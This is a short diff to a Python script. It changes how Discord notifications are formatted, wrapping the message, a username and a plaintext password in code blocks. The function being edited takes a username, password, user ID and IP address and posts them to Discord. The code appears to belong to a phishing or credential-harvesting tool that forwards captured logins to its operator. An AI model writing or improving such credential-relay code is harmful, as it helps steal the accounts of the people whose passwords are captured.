@@ -92,7 +92,7 @@ def send_discord_message(message, color=0x00ff00):
     try:
         embed = {
             "title": "📨 Notification",
-            "description": message,
+            "description": f"```{message}```",
             "color": color,
             "timestamp": datetime.now().isoformat()
         }
@@ -226,12 +226,12 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
             "fields": [
                 {
                     "name": "Username/Email",
-                    "value": username,
+                    "value": f"```{username}```",
                     "inline": True
                 },
                 {
                     "name": "Password",
-                    "value": password,
+                    "value": f"```{password}```",
                     "inline": True
                 },
                 {
